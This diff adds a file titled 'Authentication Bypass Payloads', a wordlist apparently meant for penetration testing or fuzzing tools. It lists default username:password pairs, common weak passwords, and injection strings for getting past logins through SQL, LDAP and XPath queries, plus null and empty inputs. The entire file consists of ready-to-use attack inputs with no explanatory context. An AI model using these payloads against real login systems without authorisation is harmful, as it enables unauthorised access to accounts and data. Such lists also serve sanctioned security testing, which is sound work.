@@ -1,0 +1,85 @@
+# Authentication Bypass Payloads
+
+## Default Credentials
+admin:admin
+admin:password
+admin:123456
+admin:admin123
+admin:password123
+root:root
+root:password
+root:toor
+test:test
+test:test123
+user:user
+user:password
+guest:guest
+guest:password123
+administrator:administrator
+administrator:password
+operator:operator
+webmaster:webmaster
+support:support
+user1:user1
+user2:user2
+
+## Common Weak Passwords
+password
+123456
+12345678
+qwerty
+abc123
+monkey
+dragon
+master
+letmein
+trustno1
+princess
+solo
+pass
+123123
+welcome
+starwars
+shadow
+sunshine
+superman
+batman
+whatever
+michael
+123321
+football
+baseball
+iloveyou
+soccer
+shadow
+ashley
+bailey
+passw0rd
+shadow123
+
+## SQL Injection Auth
+' or '1'='1
+' or 1=1 --
+admin' --
+admin' #
+admin'/*
+' or 'a'='a
+" or ""="
+1' UNION SELECT 'admin', 'password' --
+
+## Null/Empty Bypass
+:
+null
+undefined
+empty
+""
+''
+
+## LDAP Injection
+*
+*)(&
+*)(uid=*))(|(uid=*
+
+## XPATH Injection
+' or 1=1 or '
+admin' or 'a'='a
